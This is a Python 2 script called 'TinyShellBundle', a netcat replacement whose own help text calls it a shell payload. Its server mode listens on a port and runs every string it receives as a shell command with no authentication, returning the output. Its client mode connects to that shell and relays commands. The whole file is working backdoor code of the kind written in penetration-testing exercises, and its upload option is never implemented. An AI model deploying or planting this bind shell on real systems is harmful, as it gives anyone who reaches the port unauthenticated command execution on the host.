#!/usr/bin/python

# Standard python modules
import socket
import threading
import sys 			# Support command line args
import getopt 		# Support command line option parsing
import os			# Kill the application
import signal		# Catch an interrupt
import time			# Thread sleeping
import subprocess # For the shell


# This tool should be able to replace netcat

# The tool should be able to act as a server and as a client depending on the arguments

###############################################################################
# Start menu
def menu():
	print "TinyShellBundle can be used to act as a shell payload and as a client to connect to back to it"
	print ""
	print "Usage:"
	print ""
	print "-h, --help:               Display this menu"
	print "-t, --target=address:     The IP to bind to (default is 0.0.0.0)"
	print "-l, --listen:             Listen mode (act as a server). If this is not set, this will act as a client"
	print "-p, --port=port#:         The port number to bind to"
	print "-u, --upload=destination: Upload file to the given path on the sever"
	print ""
	print ""
	print "Examples: "
	print ""
	print "Shell service listening on 192.168.0.10:8888"
	print "./TinyShellBundle -t 192.168.0.10 -lp 8888"
	print ""
	print ""
	print "Connect to the shell service"
	print "./TinyShellBundle -t 192.168.0.10 -p 8888"
	print ""
	print ""
	print ""
	print ""

	sys.exit(0)

###############################################################################
# Client mode to connect to the server
def clientMode(target, port):

	try:

		# Set up a connection
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((target, port))

		# Print the banner to show a connection to the remote shell
		print client.recv(4096),

		# Send commands to the pyShellBundle acting as a server 
		while True:
			command = raw_input()

			try:
				client.send(command)
			
				response = client.recv(4096)
				print response,

			except Exception as err:
				print "Caught exception %s" % err
				client.close()
				return

	except Exception as err:
		print "Caught exception: %s" % err
		client.close()
		sys.exit(0)

###############################################################################
# Server mode to respond back to client
def serverMode(client, address):
	
	try:
		while True:
			
			try:
				client.send("<#pyShellBundle>:")	

				command = ""
				recv_len = 1
				
				while recv_len:

					# Receive the data in chunks
					request = client.recv(2048)

					# Check to break out of the function and get ready for another thread
					if not request:
						client.close()
						return

					command += request

					if len(request) < 2048:
						break

				# Execute the shell command
				response = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
				client.send(response)

			# Bad command input handling
			except Exception as err:
				client.send(str(err) + "\n")

	except KeyboardInterrupt:
		print "[!!] Quitting..."
		client.close()
	
	
	

###############################################################################
# Main definition
def main():

	target = "0.0.0.0"
	listen = False
	port = 0 
	upload = False


	try:
		options, remainder = getopt.getopt(sys.argv[1:], 'ht:lp:cu', ['help', 'target', 'listen', 'port', 'upload'])

	except getopt.GetoptError as err:
		print str(err)
		menu()
						
	for opt, arg in options:
		if opt in ('-h', '--help'):
			menu()
		elif opt in ('-t', '--target'):
			target = arg
		elif opt in ('-l', '--listen'):
			listen = True
		elif opt in ('-p', '--port'):
			port = int(arg)
		elif opt in ('-u', '--upload'):
			upload = True
		else:
			assert False, "Invalid option" # This throws an error

	print "Target: %s" % target
	print "Listen: %s" % listen
	print "Port: %d" % port
	print "Upload %s" % upload

	if port > 0:
		if not listen and len(target):
			clientMode(target, port)
		elif listen:
			
			# Listen on the port# Get a handle on the socket
			server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			# Bind the port
			server.bind((target, port))

			# Wait for client connection
			server.listen(5)

			while True:
				
				try:

					client, address = server.accept()

					server_thread = threading.Thread(target=serverMode, args=(client, port))
					server_thread.start()

					# Give a sec for the interrupt handling
					time.sleep(1)

				except KeyboardInterrupt, Exception:
					sys.exit(0)

		else:					# This could probably be cleaned up a little since the functions will have looping
			menu()
	else:
		menu()

###############################################################################
# Program execution

main()
